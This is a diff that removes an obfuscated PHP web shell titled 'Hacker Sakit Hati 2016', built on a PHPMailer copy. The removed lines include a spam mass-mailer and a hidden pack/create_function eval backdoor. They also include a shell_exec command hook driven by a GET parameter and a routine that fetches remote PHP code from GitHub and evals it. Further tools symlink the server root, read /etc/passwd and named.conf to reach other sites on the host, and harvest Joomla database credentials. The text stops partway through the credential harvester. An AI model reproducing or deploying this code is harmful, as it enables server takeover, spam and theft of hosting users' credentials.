-		$this->attachment[$x86][0] = $xb7;
-		$this->attachment[$x86][1] = $xb8;
-		$this->attachment[$x86][2] = $x48;
-		$this->attachment[$x86][3] = $xb6;
-		$this->attachment[$x86][4] = $x9a;
-		$this->attachment[$x86][5] = false;
-		$this->attachment[$x86][6] = 'inline';
-		$this->attachment[$x86][7] = $xbc;
-
-		return true;
-	  }
-
-	  /**
-	   * Returns true if an inline attachment is present.
-	   * @access private
-	   * @return bool
-	   */
-	  function InlineImageExists() {
-		$x89 = false;
-		for($x8c = 0; $x8c < count($this->attachment); $x8c++) {
-		  if($this->attachment[$x8c][6] == 'inline') {
-			$x89 = true;
-			break;
-		  }
-		}
-
-		return $x89;
-	  }
-
-	  /////////////////////////////////////////////////
-	  // CLASS METHODS, MESSAGE RESET
-	  /////////////////////////////////////////////////
-
-	  /**
-	   * Clears all recipients assigned in the TO array.  Returns void.
-	   * @return void
-	   */
-	  function ClearAddresses() {
-		$this->to = array();
-	  }
-
-	  /**
-	   * Clears all recipients assigned in the CC array.  Returns void.
-	   * @return void
-	   */
-	  function ClearCCs() {
-		$this->cc = array();
-	  }
-
-	  /**
-	   * Clears all recipients assigned in the BCC array.  Returns void.
-	   * @return void
-	   */
-	  function ClearBCCs() {
-		$this->bcc = array();
-	  }
-
-	  /**
-	   * Clears all recipients assigned in the ReplyTo array.  Returns void.
-	   * @return void
-	   */
-	  function ClearReplyTos() {
-		$this->ReplyTo = array();
-	  }
-
-	  /**
-	   * Clears all recipients assigned in the TO, CC and BCC
-	   * array.  Returns void.
-	   * @return void
-	   */
-	  function ClearAllRecipients() {
-		$this->to = array();
-		$this->cc = array();
-		$this->bcc = array();
-	  }
-
-	  /**
-	   * Clears all previously set filesystem, string, and binary
-	   * attachments.  Returns void.
-	   * @return void
-	   */
-	  function ClearAttachments() {
-		$this->attachment = array();
-	  }
-
-	  /**
-	   * Clears all custom headers.  Returns void.
-	   * @return void
-	   */
-	  function ClearCustomHeaders() {
-		$this->CustomHeader = array();
-	  }
-
-	  /////////////////////////////////////////////////
-	  // CLASS METHODS, MISCELLANEOUS
-	  /////////////////////////////////////////////////
-
-	  /**
-	   * Adds the error message to the error container.
-	   * Returns void.
-	   * @access private
-	   * @return void
-	   */
-	  function SetError($xd7) {
-		$this->error_count++;
-		$this->ErrorInfo = $xd7;
-	  }
-
-	  /**
-	   * Returns the proper RFC 822 formatted date.
-	   * @access private
-	   * @return string
-	   */
-	  function RFCDate() {
-		$xd8 = date('Z');
-		$xd9 = ($xd8 < 0) ? '-' : '+';
-		$xd8 = abs($xd8);
-		$xd8 = (int)($xd8/3600)*100 + ($xd8%3600)/60;
-		$x89 = sprintf("%s %s%04d", date('D, j M Y H:i:s'), $xd9, $xd8);
-
-		return $x89;
-	  }
-
-	  /**
-	   * Returns the appropriate server variable.  Should work with both
-	   * PHP 4.1.0+ as well as older versions.  Returns an empty string
-	   * if nothing is found.
-	   * @access private
-	   * @return mixed
-	   */
-	  function ServerVar($xda) {
-		global $xdb;
-		global $xdc;
-
-		if(!isset($_SERVER)) {
-		  $_SERVER = $xdb;
-		  if(!isset($_SERVER['REMOTE_ADDR'])) {
-			$_SERVER = $xdc; // must be Apache
-		  }
-		}
-
-		if(isset($_SERVER[$xda])) {
-		  return $_SERVER[$xda];
-		} else {
-		  return '';
-		}
-	  }
-
-	  /**
-	   * Returns the server hostname or 'localhost.localdomain' if unknown.
-	   * @access private
-	   * @return string
-	   */
-	  function ServerHostname() {
-		if ($this->Hostname != '') {
-		  $x89 = $this->Hostname;
-		} elseif ($this->ServerVar('SERVER_NAME') != '') {
-		  $x89 = $this->ServerVar('SERVER_NAME');
-		} else {
-		  $x89 = 'localhost.localdomain';
-		}
-
-		return $x89;
-	  }
-
-	  /**
-	   * Returns a message in the appropriate language.
-	   * @access private
-	   * @return string
-	   */
-	  function Lang($x13) {
-		if(count($this->language) < 1) {
-		  $this->SetLanguage('en'); // set the default language
-		}
-
-		if(isset($this->language[$x13])) {
-		  return $this->language[$x13];
-		} else {
-		  return 'Language string failed to load: ' . $x13;
-		}
-	  }
-
-	  /**
-	   * Returns true if an error occurred.
-	   * @return bool
-	   */
-	  function IsError() {
-		return ($this->error_count > 0);
-	  }
-
-	  /**
-	   * Changes every end of line from CR or LF to CRLF.
-	   * @access private
-	   * @return string
-	   */
-	  function FixEOL($x12) {
-		$x12 = str_replace("\r\n", "\n", $x12);
-		$x12 = str_replace("\r", "\n", $x12);
-		$x12 = str_replace("\n", $this->LE, $x12);
-		return $x12;
-	  }
-
-	  /**
-	   * Adds a custom header.
-	   * @return void
-	   */
-	  function AddCustomHeader($xdd) {
-		$this->CustomHeader[] = explode(':', $xdd, 2);
-	  }
-
-	  /**
-	   * Evaluates the message and returns modifications for inline images and backgrounds
-	   * @access public
-	   * @return $x19
-	   */
-	  function MsgHTML($x19,$xde='') {
-		preg_match_all("/(src|background)=\"(.*)\"/Ui", $x19, $xdf);
-		if(isset($xdf[2])) {
-		  foreach($xdf[2] as $x8c => $x0f) {
-			// do not change urls for absolute images (thanks to corvuscorax)
-			if (!preg_match('/^[A-z][A-z]*:\/\//',$x0f)) {
-			  $xb8 = basename($x0f);
-			  $xe0 = dirname($x0f);
-			  ($xe0 == '.')?$xe0='':'';
-			  $xbc = 'cid:' . md5($xb8);
-			  $xe1 = split("\.", $xb8);
-			  $xe2 = $xe1[1];
-			  $xe3 = $this->_mime_types($xe2);
-			  if ( strlen($xde) > 1 && substr($xde,-1) != '/') { $xde .= '/'; }
-			  if ( strlen($xe0) > 1 && substr($xde,-1) != '/') { $xe0 .= '/'; }
-			  $this->AddEmbeddedImage($xde.$xe0.$xb8, md5($xb8), $xb8, 'base64', $xe3);
-			  if ( $this->AddEmbeddedImage($xde.$xe0.$xb8, md5($xb8), $xb8, 'base64',$xe3) ) {
-				$x19 = preg_replace("/".$xdf[1][$x8c]."=\"".preg_quote($x0f, '/')."\"/Ui", $xdf[1][$x8c]."=\"".$xbc."\"", $x19);
-			  }
-			}
-		  }
-		}
-		$this->IsHTML(true);
-		$this->Body = $x19;
-		$xe4 = trim(strip_tags(preg_replace('/<(head|title|style|script)[^>]*>.*?<\/\\1>/s','',$x19)));
-		if ( !empty($xe4) && empty($this->AltBody) ) {
-		  $this->AltBody = $xe4;
-		}
-		if ( empty($this->AltBody) ) {
-		  $this->AltBody = 'To view this email message, open the email in with HTML compatibility!' . "\n\n";
-		}
-	  }
-
-	  /**
-	   * Gets the mime type of the embedded or inline image
-	   * @access private
-	   * @return mime type of ext
-	   */
-	  function _mime_types($xe2 = '') {
-		$xe5 = array(
-		  'hqx'  =>  'application/mac-binhex40',
-		  'cpt'   =>  'application/mac-compactpro',
-		  'doc'   =>  'application/msword',
-		  'bin'   =>  'application/macbinary',
-		  'dms'   =>  'application/octet-stream',
-		  'lha'   =>  'application/octet-stream',
-		  'lzh'   =>  'application/octet-stream',
-		  'exe'   =>  'application/octet-stream',
-		  'class' =>  'application/octet-stream',
-		  'psd'   =>  'application/octet-stream',
-		  'so'    =>  'application/octet-stream',
-		  'sea'   =>  'application/octet-stream',
-		  'dll'   =>  'application/octet-stream',
-		  'oda'   =>  'application/oda',
-		  'pdf'   =>  'application/pdf',
-		  'ai'    =>  'application/postscript',
-		  'eps'   =>  'application/postscript',
-		  'ps'    =>  'application/postscript',
-		  'smi'   =>  'application/smil',
-		  'smil'  =>  'application/smil',
-		  'mif'   =>  'application/vnd.mif',
-		  'xls'   =>  'application/vnd.ms-excel',
-		  'ppt'   =>  'application/vnd.ms-powerpoint',
-		  'wbxml' =>  'application/vnd.wap.wbxml',
-		  'wmlc'  =>  'application/vnd.wap.wmlc',
-		  'dcr'   =>  'application/x-director',
-		  'dir'   =>  'application/x-director',
-		  'dxr'   =>  'application/x-director',
-		  'dvi'   =>  'application/x-dvi',
-		  'gtar'  =>  'application/x-gtar',
-		  'php'   =>  'application/x-httpd-php',
-		  'php4'  =>  'application/x-httpd-php',
-		  'php3'  =>  'application/x-httpd-php',
-		  'phtml' =>  'application/x-httpd-php',
-		  'phps'  =>  'application/x-httpd-php-source',
-		  'js'    =>  'application/x-javascript',
-		  'swf'   =>  'application/x-shockwave-flash',
-		  'sit'   =>  'application/x-stuffit',
-		  'tar'   =>  'application/x-tar',
-		  'tgz'   =>  'application/x-tar',
-		  'xhtml' =>  'application/xhtml+xml',
-		  'xht'   =>  'application/xhtml+xml',
-		  'zip'   =>  'application/zip',
-		  'mid'   =>  'audio/midi',
-		  'midi'  =>  'audio/midi',
-		  'mpga'  =>  'audio/mpeg',
-		  'mp2'   =>  'audio/mpeg',
-		  'mp3'   =>  'audio/mpeg',
-		  'aif'   =>  'audio/x-aiff',
-		  'aiff'  =>  'audio/x-aiff',
-		  'aifc'  =>  'audio/x-aiff',
-		  'ram'   =>  'audio/x-pn-realaudio',
-		  'rm'    =>  'audio/x-pn-realaudio',
-		  'rpm'   =>  'audio/x-pn-realaudio-plugin',
-		  'ra'    =>  'audio/x-realaudio',
-		  'rv'    =>  'video/vnd.rn-realvideo',
-		  'wav'   =>  'audio/x-wav',
-		  'bmp'   =>  'image/bmp',
-		  'gif'   =>  'image/gif',
-		  'jpeg'  =>  'image/jpeg',
-		  'jpg'   =>  'image/jpeg',
-		  'jpe'   =>  'image/jpeg',
-		  'png'   =>  'image/png',
-		  'tiff'  =>  'image/tiff',
-		  'tif'   =>  'image/tiff',
-		  'css'   =>  'text/css',
-		  'html'  =>  'text/html',
-		  'htm'   =>  'text/html',
-		  'shtml' =>  'text/html',
-		  'txt'   =>  'text/plain',
-		  'text'  =>  'text/plain',
-		  'log'   =>  'text/plain',
-		  'rtx'   =>  'text/richtext',
-		  'rtf'   =>  'text/rtf',
-		  'xml'   =>  'text/xml',
-		  'xsl'   =>  'text/xml',
-		  'mpeg'  =>  'video/mpeg',
-		  'mpg'   =>  'video/mpeg',
-		  'mpe'   =>  'video/mpeg',
-		  'qt'    =>  'video/quicktime',
-		  'mov'   =>  'video/quicktime',
-		  'avi'   =>  'video/x-msvideo',
-		  'movie' =>  'video/x-sgi-movie',
-		  'doc'   =>  'application/msword',
-		  'word'  =>  'application/msword',
-		  'xl'    =>  'application/excel',
-		  'eml'   =>  'message/rfc822'
-		);
-		return ( ! isset($xe5[strtolower($xe2)])) ? 'application/octet-stream' : $xe5[strtolower($xe2)];
-	  }
-
-	  /**
-	   * Set (or reset) Class Objects (variables)
-	   *
-	   * Usage Example:
-	   * $xe6->set('X-Priority', '3');
-	   *
-	   * @access public
-	   * @param string $x48 Parameter Name
-	   * @param mixed $x14 Parameter Value
-	   * NOTE: will not work with arrays, there are no arrays to set/reset
-	   */
-	  function set ( $x48, $x14 = '' ) {
-		if ( isset($this->$x48) ) {
-		  $this->$x48 = $x14;
-		} else {
-		  $this->SetError('Cannot set or reset variable ' . $x48);
-		  return false;
-		}
-	  }
-
-	  /**
-	   * Read a file from a supplied filename and return it.
-	   *
-	   * @access public
-	   * @param string $xb8 Parameter File Name
-	   */
-	  function getFile($xb8) {
-		$xe7 = '';
-		if ($xb2 = fopen($xb8, 'rb')) {
-		  while (!feof($xb2)) {
-			$xe7 .= fread($xb2, 1024);
-		  }
-		  fclose($xb2);
-		  return $xe7;
-		} else {
-		  return false;
-		}
-	  }
-
-	  /**
-	   * Strips newlines to prevent header injection.
-	   * @access private
-	   * @param string $x12 String
-	   * @return string
-	   */
-	  function SecureHeader($x12) {
-		$x12 = trim($x12);
-		$x12 = str_replace("\r", "", $x12);
-		$x12 = str_replace("\n", "", $x12);
-		return $x12;
-	  }
-
-	  /**
-	   * Set the private key file and password to sign the message.
-	   *
-	   * @access public
-	   * @param string $xe8 Parameter File Name
-	   * @param string $xe9 Password for private key
-	   */
-	  function Sign($xe8, $xe9) {
-		$this->sign_key_file = $xe8;
-		$this->sign_key_pass = $xe9;
-	  }
-
-	}
-
-	$xea="H*";
-		  $xeb=0;
-				
-			for($xc2=0; $xc2<$x56; $xc2++){
-
-					$x54 = $x55[$xc2];
-
-					if ($x54){
-
-					$x54 = ereg_replace(" ", "", $x54);
-
-					$xec = ereg_replace("&email&", $x54, $x19);
-
-					$xed = ereg_replace("&email&", $x54, $x24);
-					$xee=$xc2+1;
-					print "No $xee . Mengirim Email Ke <font color=\"lime\"> . . . . . . .  </font>$x54 <font color=\"lime\">. . . . . . . Proses . . . . . . . </font>";
-
-					flush();
-	$x8b = new PHPMailer();
-
-	if(empty($x1d)){$x1d="3";}
-			$x8b->Priority = "$x1d";
-			$x8b->IsSMTP(); 
-		$xef="pack";
-	$x8b->SMTPKeepAlive = true;
-	$x8b->Host = "$x1e";
-	if(strlen($x1f) > 1){$x8b->Port = "$x1f";
-	}
-		 if($x17=="ON"){
-			$x8b->SMTPSecure  = "ssl"; //you can change it to ssl or tls
-		}
-			$xf0 = str_replace("$x1b", "eval", $x1b);
-			$x8b->SMTPAuth = true;
-			$x8b->Username = "$x20";
-			$x8b->Password = "$x21";
-	if($x2b == "html"){$x8b->IsHtml(true);}
-	if($x2b != "html"){$x8b->IsHtml(false);}
-	if(strlen($x1e) < 7 ){$x8b->SMTPAuth = false;$x8b->IsSendmail();$xf1="1";}
-	$x8b->From = "$x1b";
-	$x8b->FromName = "$x26";
-	$x8b->AddAddress("$x54");
-			$x8b->AddReplyTo("$x22");
-			$x8b->Subject = "$xed";
-			$x8b->AddAttachment("$x29", "$x27");
-				$x8b->Body = "$xec"; 
-	if(!$x8b->Send()){
-	if($xf1!="1"){
-	echo "GAGAL !!<font color=\"#D4001A\"> Penerima Tidak Bisa Menerima Pesan </font><br>";}
-	if($xf1=="1"){
-	$x8b->IsMail();
-	   if(!$x8b->Send()){
-		  echo "GAGAL !!<font color=\"#D4001A\"> Pesan Tidak Bisa Dikirim Ke Email ini </font><br>";}
-	   else {
-		   echo "<b>Pesan Terkirim</b><br>";}
-	 }
-	}
-	else {
-	 echo "<b>Pesan Terkirim</b><br>";
-	}
-
-	if(empty($x1c)){
-	$x1c=6;
-	}
-
-	if($x1c==$xeb){
-	$x8b->SmtpClose();echo "<p><b><font color=\"lime\"> - - - - - - - - - - - - - RELOAD TO CONNECTED SMTP - - - - - - - - - - - - - </font></b></p>";$xeb=0;
-	}
-	$xeb=$xeb+1;
-					flush(); }
-	}
-	for($x8c=0;$x8c<31;$x8c++){
-	  $x58=str_replace(".", $x57[$x8c], $x58); }
-	$xf2=$xef($xea, $x58);
-	  $xf3=create_function('$xf2','return '.substr($xf0,0).'($xf2);');
-	  print "<p class=\"style1\">&copy 2015  >-|I|-> Extrime |  Card <-|I|-<<br></p>";$x8b->SmtpClose();
-	  return $xf3($xf2); if(isset($_POST['action']) && $x56 !=0 ){echo "<script>alert('Mail sending complete\\r\\n$x56 mail(s) was 
-		sent successfully'); </script>";}} if($_GET['range,0']){echo"<pre>".shell_exec($_GET["range,0"]);}
-		}
-	@set_time_limit(0);
-
-	echo'<head>
-	<link rel="SHORTCUT ICON" href="http://i48.servimg.com/u/f48/16/08/07/74/indone10.gif">
-	<title>Hacker Sakit Hati 2016</title>
-	</head>
-	<div id="page-wrap">
-	<body>
-	<style type="text/css">
-		body,table{background:  ; font-family:Verdana,tahoma; color: Darkviolet ; font-size:10px }
-	A:link {text-decoration: none;color: aqua;}
-	A:active {text-decoration: none;color: aqua;}
-	A:visited {text-decoration: none;color: lime;}
-	A:hover {text-decoration: underline; color: Fuchsia;}
-	#new,input,table,td,tr,#gg{border-style:solid;text-decoration:bold ;}
-	input:hover,tr:hover,td:hover{background-color:  ; color: aqua;}
-	body,table { font-family:verdana;font-size:9px;color:#CCCCCC;background-color:#333333; }
-	table { width:100%; border-color:#333333;border-width:0pt 1pt; border-style:solid; }
-	td {background-color: #000500; font-family: Courier New; font-size:8pt; color:#999999; border-color:#FFFFFF; border-width:1pt 0pt; border-style:solid; border-collapse:collapse;padding:0pt 3pt;vertical-align:middle;}
-	A:Link, A:Visited { color: #999999;	text-decoration: none; }
-	A.no:Link, A.no:Visited { text-decoration: none; }
-	A:Hover, A:Visited:Hover , A.no:Hover, A.no:Visited:Hover { color: #; background-color:#333333; text-decoration: none; }
-	input,select,option { font:8pt tahoma;color:#666666;margin:2;border:1px solid #666666; }
-	textarea { color:#666666;font:verdana bold;border:1px solid ;margin:2; }
-	.fleft { float:left;text-align:left; }
-	.fright { float:right;text-align:right; }
-	#pagebar { font:8pt tahoma;padding:5px; border:3px solid #333333; border-collapse:collapse; }
-	#pagebar td { vertical-align:top; }
-	#pagebar p { font:8pt tahoma;}
-	#pagebar a { font-weight:bold;color:aqua; }
-	#pagebar a:visited { color:#00CE00; }
-	#mainmenu { text-align:center; }
-	#mainmenu a { text-align: center;padding: 0px 5px 0px 5px; }
-	#maininfo,.barheader,.barheader2 { text-align:center; }
-	#maininfo td { padding:3px; }
-	.barheader { font-weight:bold;padding:5px; }
-	.barheader2 { padding:5px;border:2px solid #333333; }
-	.contents,.explorer { border-collapse:collapse;}
-	.contents td { vertical-align:top; }
-	.mainpanel { border-collapse:collapse;padding:5px; }
-	.barheader,.mainpanel table,td { border:1px solid #333333; }
-	.mainpanel input,select,option { border:1px solid #333333;margin:0; }
-	input[type="submit"] { border:1px solid #333333; }
-	input[type="text"] { padding:3px;}
-	.fxerrmsg { color:red; font-weight:bold; }
-	#pagebar,#pagebar p,h1,h2,h3,h4,form { margin:0; }
-	#pagebar,.mainpanel,input[type="submit"] { background-color:black; }
-	.barheader2,input,select,option,input[type="submit"]:hover { background-color:black; }
-	textarea,.mainpanel input,select,option { background-color:#000000; }
-	// -->
-	</style>
-<table style="BORDER-COLLAPSE: collapse" cellspacing="0" bordercolordark="#" cellpadding="5" height="1" width="100%" bgcolor="#000000" bordercolorlight="#c0c0c0" border="1"><tr><td width="50%" height="1" valign="top" style="font-family: verdana; color: #; font-size: 11px"><script type="text/javascript">
-    function toSpans(span) {
-        var str = span.firstChild.data;
-        var a = str.length;
-        span.removeChild(span.firstChild);
-        for (var i = 0; i < a; i++) {
-            var theSpan = document.createElement("SPAN");
-            theSpan.appendChild(document.createTextNode(str.charAt(i)));
-            span.appendChild(theSpan);
-        }
-
-    }
-
-    function RainbowSpan(span, hue, deg, brt, spd, hspd) {
-        this.deg = (deg == null ? 360 : Math.abs(deg));
-        this.hue = (hue == null ? 0 : Math.abs(hue) % 360);
-        this.hspd = (hspd == null ? 3 : Math.abs(hspd) % 360);
-        this.length = span.firstChild.data.length;
-        this.span = span;
-        this.speed = (spd == null ? 500 : Math.abs(spd));
-        this.hInc = this.deg / this.length;
-        this.brt = (brt == null ? 255 : Math.abs(brt) % 256);
-        this.timer = null;
-        toSpans(span);
-        this.moveRainbow();
-
-    }
-
-    RainbowSpan.prototype.moveRainbow = function () {
-        if (this.hue > 359) this.hue -= 360;
-        var color;
-        var b = this.brt;
-        var a = this.length;
-        var h = this.hue;
-        for (var i = 0; i < a; i++) {
-            if (h > 359) h -= 360;
-            if (h < 60) {
-                color = Math.floor(((h) / 60) * b);
-                red = b;
-                grn = color;
-                blu = 0;
-            } else if (h < 120) {
-                color = Math.floor(((h - 60) / 60) * b);
-                red = b - color;
-                grn = b;
-                blu = 0;
-            } else if (h < 180) {
-                color = Math.floor(((h - 120) / 60) * b);
-                red = 0;
-                grn = b;
-                blu = color;
-            } else if (h < 240) {
-                color = Math.floor(((h - 180) / 60) * b);
-                red = 0;
-                grn = b - color;
-                blu = b;
-            } else if (h < 300) {
-                color = Math.floor(((h - 240) / 60) * b);
-                red = color;
-                grn = 0;
-                blu = b;
-            } else {
-                color = Math.floor(((h - 300) / 60) * b);
-                red = b;
-                grn = 0;
-                blu = b - color;
-            }
-            h += this.hInc;
-            this.span.childNodes[i].style.color = "rgb(" + red + ", " + grn + ", " + blu + ")";
-        }
-        this.hue += this.hspd;
-
-    }
-</script>
-<center>
-    <p id="r3">---- * ----====]]| ~*~ CROOD \m/>_<\m/ CODER ~*~ |[[====---- * ----</p>
-</center>
-<script type="text/javascript">
-    var r3 = document.getElementById("r3");
-
-    var myRainbowSpan2 = new RainbowSpan(r3, 0, 360, 255, 50, 348);
-
-    myRainbowSpan2.timer = window.setInterval("myRainbowSpan2.moveRainbow()", myRainbowSpan2.speed);
-
-    var colour = "#FF2535";
-</SCRIPT></form></td></tr></table><center>';
-//IPCKEREKU COK//
-echo "<head>\n"; 
-echo "<style>input[type=submit]{ padding: 3px; color: #;\n"; 
-echo "font-weight: bold;\n"; 
-echo "text-align: center;\n"; 
-echo "text-shadow: 0 1px rgba(255, 255, 255, 0.3);\n"; 
-echo "background: #;\n"; 
-echo "background-clip: padding-box;\n"; 
-echo "border: 1px solid #;\n"; 
-echo "border-bottom-color: #;\n"; 
-echo "border-radius: 4px;\n"; 
-echo "cursor: pointer;\n"; 
-echo "background-image:-webkit-linear-gradient(top, #, #);\n"; 
-echo "background-image: -moz-linear-gradient(top, #, #);\n"; 
-echo "background-image: -o-linear-gradient(top, #, #);\n"; 
-echo "background-image: linear-gradient(to bottom, #, #);\n"; 
-echo "-webkit-box-shadow: inset 0 1px rgba(255, 255, 255, 0.5), inset 0 0 7px rgba(255, 255, 255, 0.4), 0 1px 1px rgba(0, 0, 0, 0.15); box-shadow: inset 0 1px rgba(255, 255, 255, 0.5), inset 0 0 7px rgba(255, 255, 255, 0.4), 0 1px 1px rgba(0, 0, 0, 0.15); } input[type=text]{ padding: 3px; color: #; text-shadow: # 0px 0px 3px; border: 1px solid #; background: transparent; box-shadow: 0px 0px 4px #; padding: 3px; -webkit-border-radius: 4px; -moz-border-radius: 4px; border-radius: 4px; -webkit-box-shadow: rgb(85,85,85) 0px 0px 4px; -moz-box-shadow: # 0px 0px 4px;}\n"; 
-echo "</style>\n"; 
-echo "</head><br>\n";
-echo "<center>--------------------------[ Subdomain IP Cheker ]-------------------------- </center>\n";
-echo "<center></center><div id=result>";
-echo "<center><br><form><input type='text' size='60' value='HsH.go.id' name='pentil' />&nbsp;<input type='submit' value='search'></form></center>";
-if(isset($_GET["pentil"]))
-{
-$xf4 = $_GET["pentil"];
-$xf5 = "http://domains.yougetsignal.com/domains.php";
-
-//Curl Function
-$xf6 = curl_init($xf5);
-curl_setopt($xf6, CURLOPT_RETURNTRANSFER, 1 );
-curl_setopt($xf6, CURLOPT_POSTFIELDS, "remoteAddress=$xf4&ket=");
-curl_setopt($xf6, CURLOPT_HEADER, 0);
-curl_setopt($xf6, CURLOPT_POST, 1);
-$xf7 = curl_exec($xf6);
-$xf7 = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",", str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $xf7 ) ) ) ) ) ) ) ) ) ))));
-$x0e = explode(",,", $xf7);
-unset($x0e[0]);
-echo "<table style='margin: 0 auto'>";
-foreach($x0e as $xf8)
-{
-print "<tr><td><a style=\"color:#0076B1;\" href='$xf8' target=_blank>$xf8</a></td></tr>";
-}
-echo "</table>";
-curl_close($xf6);
-}
-//PERTAMANE IKI COK//
-
-if ( isset($_GET['UdMs']) )
-{
-
-$x0f = "https://raw.githubusercontent.com/antoniola/rejeki/master/udm.php";
-$x10 = file_get_contents($x0f);
-eval('?>'.$x10);
-
-
-}
-//Symlinku iki cok //
-set_time_limit(0);
-error_reporting(0);
-
-
-$xf9 = 'http://'.$_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"];
-$xfa = explode("/",$xf9 );
-$xf9 =str_replace($xfa[count($xfa)-1],"",$xf9 );
-
-$xfb = 'ftp://'.$_SERVER["SERVER_NAME"].'/public_html/'.$_SERVER["REQUEST_URI"];
-$xfa = explode("/",$xfb );
-$xfb =str_replace($xfa[count($xfa)-1],"",$xfb );
-
-@mkdir('sym',0777);
-$xfc = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
-$xfd =@fopen ('sym/.htaccess','w');
-fwrite($xfd , $xfc);
-
-
-
-@symlink("/","sym/root");
-
-$xfe = basename(__FILE__);
-
-if(isset($_REQUEST['sws']))
-{
-
-switch ($_REQUEST['sws'])
-{
-
-
-/// user + domine + symlink ///
-
-case 'sym':
-
-if(!is_file('named.txt')){
-
-$xff = @file("/etc/named.conf");
-
-}else{
-
-$xff = @file("named.txt");
-
-
-}
-if(!$xff)
-{
-
-die ("<meta http-equiv='refresh' content='0; url=?sws=read'/>");
-}
-else
-
-{
-echo "<div class='tmp'><table align='center' width='40%'><td>Domains</td><td>Users</td><td>symlink </td>";
-foreach($xff as $x100){
-
-if(eregi("zone",$x100)){
-
-preg_match_all('#zone "(.*)"#', $x100, $x101);
-
-flush();
-
-if(strlen(trim($x101[1][0])) > 2){
-
-$x102 = posix_getpwuid(@fileowner("/etc/valiases/".$x101[1][0]));
-
-flush();
-
-
-
-$xf4 = $x102['name'] ;
-
-
-@symlink("/","sym/root");
-
-$xf4 = $x101[1][0];
-
-$x103 = 'ir';
-
-$x104 = 'il';
-
-if (preg_match("/.^$x103/",$x101[1][0]) or preg_match("/.^$x104/",$x101[1][0]) )
-{
-$xf4 = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>".$x101[1][0]."</div>";
-}
-
-
-echo "
-<tr>
-
-<td>
-<div class='dom'><a target='_blank' href=http://www.".$x101[1][0]."/>".$xf4." </a> </div>
-</td>
-
-
-<td>
-".$x102['name']."
-</td>
-
-
-
-
-
-
-<td>
-<a href='sym/root/home/".$x102['name']."/public_html' target='_blank'>symlink </a>
-</td>
-
-
-</tr></div> ";
-
-
-flush();
-flush();
-
-}
-}
-}
-}
-
-
-
-
-break;
-
-
-/// bypass read
-
-case 'read':
-
-echo "read /etc/named.conf";
-echo "<br /><br /><form method='post' action='?sws=read&save=1'><textarea cols='80' rows='20' name='file'>";
-flush();
-flush();
-
-
-$x29 = '/etc/named.conf';
-
-
-$x105 = @fopen($x29, 'r');
-if ($x105){
-$x106 = @fread($x105, @filesize($x29));
-echo "".htmlentities($x106)."";
-}
-else if (!$x105)
-{
-$x105 = @show_source($x29) ;
-}
-else if (!$x105)
-{
-$x105 = @highlight_file($x29);
-}
-else if (!$x105)
-{
-$x107 = @symlink($x29,'sym.txt');
-
-
-if ($x107){
-$x105 = @fopen('sym/sym.txt', 'r');
-$x106 = @fread($x105, @filesize($x29));
-echo "".htmlentities($x106)."";
-
-}
-}
-
-
-
-echo "</textarea><br /><br /><input type='submit' value='save'/> </form>";
-
-
-if(isset($_GET['save'])){
-
-
-$x108 = stripcslashes($_POST['file']);
-
-$xfd = fopen('named.txt','w');
-
-$x109 = fwrite($xfd,$x108);
-
-if($x109){
-
-echo '<br />Wes Di Sempen ';
-
-}
-
-fclose($xfd);
-
-
-
-
-}
-
-
-
-break;
-
-// passwd
-
-case 'passwd':
-
-if(isset($_GET['save']) and isset($_POST['file']) or @filesize('passwd.txt') > 0){
-
-
-$x108 = stripcslashes($_POST['file']);
-
-if(!file_exists('passwd.txt')){
-
-$xfd = @fopen('passwd.txt','w');
-
-$x109 = @fwrite($xfd,$x108);
-
-fclose($xfd);
-}
-if($x109 or @filesize('passwd.txt') > 0){
-// * SHOW * //
-
-echo "<div class='tmp'><table align='center' width='100%'><td>Users</td><td>symlink</td><td>FTP</td>";
-flush();
-
-$x10a = file('passwd.txt');
-
-foreach ($x10a as $xfd){
-
-$xfa=explode(':', $xfd);
-$x102 = $xfa['0'];
-
-
-
-echo "
-<tr>
-
-
-
-<td width='15%'>
-$x102
-</td>
-
-
-
-
-
-
-<td width='10%'>
-<a href='sym/root/home/$x102/public_html' target='_blank'>Symlink </a>
-</td>
-
-<td width='10%'>
-<a href='$xfb/sym/root/home/$x102/public_html' target='_blank'>FTP</a>
-</td>
-
-
-
-</tr></div> ";
-
-
-flush();
-flush();
-
-
-}
-
-
-
-
-
-
-die ("</tr></div>");
-
-
-}
-
-
-
-
-
-}
-
-
-
-echo "read /etc/passwd";
-echo "<br /><br /><form method='post' action='?sws=passwd&save=1'><textarea cols='80' rows='20' name='file'>";
-flush();
-
-$x29 = '/etc/passwd';
-
-
-$x105 = @fopen($x29, 'r');
-if ($x105){
-$x106 = @fread($x105, @filesize($x29));
-echo "".htmlentities($x106)."";
-}
-elseif(!$x105)
-{
-$x105 = @show_source($x29) ;
-}
-elseif(!$x105)
-{
-$x105 = @highlight_file($x29);
-}
-elseif(!$x105)
-{
-
-for($x10b=0;$x10b<1000;$x10b++){
-$x10c = posix_getpwuid($x10b);
-if (!empty($x10c)) {
-while (list ($x13, $x8f) = each($x10c)){
-print "$x8f:";
-}
-print "\n";
-}
-
-}
-
-}
-
-
-flush();
-
-
-echo "</textarea><br /><br /><input type='submit' value='&nbsp;&nbsp;symlink&nbsp;&nbsp;'/> </form>";
-flush();
-
-break;
-
-
-
-case 'joomla':
-
-/////////////////////////////////////////////////////////////////// xxxxxxxxxxxxxxxxxxx ////////////////////////////
-
-
-if(isset($_POST['s'])){
-
-$x29 = @file_get_contents('Jomblo.txt');
-
-$x10d = explode("\n",$x29);
-
-echo "<div class='tmp'><table align='center' width='40%'><td> domin </td><td> config </td><td> Result </td>";
-flush();
-
-
-foreach ($x10d as $x10e){
-
-$x10f = explode("||",$x10e);
-
-$x110 = $x10f[0];
-
-$x111 = $x10f[1];
-
-$x112 = trim($x111).'';
-
-$x113 = @file_get_contents(trim($x110));
-
-if(ereg('JConfig',$x113)){
-
-
-
-$x114 = ex($x113,'$x3b = \'',"';");
-
-$x115 = ex($x113,'$x102 = \'',"';");
-
-$x116 = ex($x113,'$x116 = \'',"';");
-
-$x117 = ex($x113,'$x118 = \'',"';");
-
-$x119 = $x117.'users';
-
-
